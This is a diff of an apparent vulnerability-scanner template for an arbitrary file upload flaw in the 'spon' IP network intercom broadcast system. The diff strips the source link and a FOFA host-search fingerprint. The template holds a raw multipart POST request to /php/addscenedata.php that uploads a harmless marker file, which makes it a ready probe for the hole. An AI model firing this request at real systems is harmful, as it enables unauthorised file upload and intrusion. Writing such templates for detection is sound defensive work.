@@ -3,12 +3,8 @@ info:
   name: spon IP网络对讲广播系统任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oc2rbhvqkgqxm8ml'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oc2rbhvqkgqxm8ml
-    fofa: icon_hash="-1700598274"
 http:
 - raw:
   - 'POST /php/addscenedata.php HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     dudesuite
